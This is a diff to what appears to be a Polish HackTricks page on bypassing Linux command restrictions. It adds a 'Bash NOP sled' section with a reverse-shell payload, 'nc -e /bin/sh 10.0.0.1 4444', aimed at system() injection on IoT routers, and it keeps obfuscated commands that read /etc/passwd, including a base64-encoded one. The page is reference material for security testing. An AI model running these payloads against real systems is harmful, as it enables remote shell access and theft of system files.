@@ -110,7 +110,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Ominić rury
+### Ominięcie potoków
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -294,25 +294,47 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Ominięcie Ochrony Tylko do Odczytu/Noexec/Distroless
+## Bypass tylko do odczytu/brak wykonania/bez dystrybucji
 
-Jeśli znajdujesz się w systemie plików z **ochroną tylko do odczytu i noexec** lub nawet w kontenerze distroless, wciąż istnieją sposoby na **wykonanie dowolnych binarek, nawet powłoki!:**
+Jeśli znajdujesz się w systemie plików z **ochronami tylko do odczytu i brakiem wykonania** lub nawet w kontenerze bez dystrybucji, wciąż istnieją sposoby na **wykonanie dowolnych binarnych plików, nawet powłoki!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Ominięcie Chroot i innych Więzień
+## Bypass Chroot i innych więzień
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Odniesienia i Więcej
+## Oparcie na przestrzeni Bash NOP Sled ("Bashsledding")
+
+Gdy luka pozwala ci częściowo kontrolować argument, który ostatecznie trafia do `system()` lub innej powłoki, możesz nie znać dokładnego przesunięcia, w którym wykonanie zaczyna odczytywać twój ładunek. Tradycyjne NOP sleds (np. `\x90`) **nie** działają w składni powłoki, ale Bash zignoruje wiodące białe znaki przed wykonaniem polecenia.
+
+Dlatego możesz stworzyć *NOP sled dla Basha* poprzez dodanie długiej sekwencji spacji lub znaków tabulacji przed swoim rzeczywistym poleceniem:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Jeśli łańcuch ROP (lub jakikolwiek prymityw pamięciowy) umieści wskaźnik instrukcji gdziekolwiek w obrębie bloku przestrzeni, parser Bash po prostu pomija białe znaki, aż dotrze do `nc`, niezawodnie wykonując twoje polecenie.
+
+Praktyczne przypadki użycia:
+
+1. **Bloby konfiguracji mapowanej w pamięci** (np. NVRAM), które są dostępne w różnych procesach.
+2. Sytuacje, w których atakujący nie może zapisać bajtów NULL, aby wyrównać ładunek.
+3. Urządzenia wbudowane, w których dostępny jest tylko BusyBox `ash`/`sh` – również ignorują wiodące spacje.
+
+> 🛠️  Połącz ten trik z gadżetami ROP, które wywołują `system()`, aby dramatycznie zwiększyć niezawodność exploitów na routerach IoT z ograniczoną pamięcią.
+
+## Odniesienia i więcej
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
